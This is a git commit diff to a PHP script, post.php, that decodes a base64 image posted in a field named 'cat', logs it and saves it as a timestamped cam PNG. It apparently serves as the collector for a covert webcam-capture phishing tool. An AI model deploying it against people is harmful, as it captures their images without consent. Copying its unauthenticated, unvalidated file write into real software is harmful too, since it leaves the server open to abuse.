952ce5b18bba8e9ce444e677b455a5c950635b6a
Menodkumar <86545374+Menodkumar@users.noreply.github.com>
2025-11-18 06:27:08 +0530

    Improve image upload processing in post.php
    Refactor image data handling and logging.

--- post.php
+++ post.php
@@ -1,19 +1,13 @@
 <?php
-
-$date = date('dMYHis');
-$imageData=$_POST['cat'];
-
+date_default_timezone_set('Asia/Kolkata');
+$imageData = $_POST['cat'];
 if (!empty($_POST['cat'])) {
-error_log("Received" . "\r\n", 3, "Log.log");
-
+    error_log("Received . " . $_POST['cat'], 3, "Log.log");
+    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
+    $unencodedData = base64_decode($filteredData);
+    $fp = fopen("cam" . date('dMYHis') . ".png", 'wb');
+    fwrite($fp, $unencodedData);
+    fclose($fp);
+    exit();
 }
-
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
-
-exit();
 ?>
-
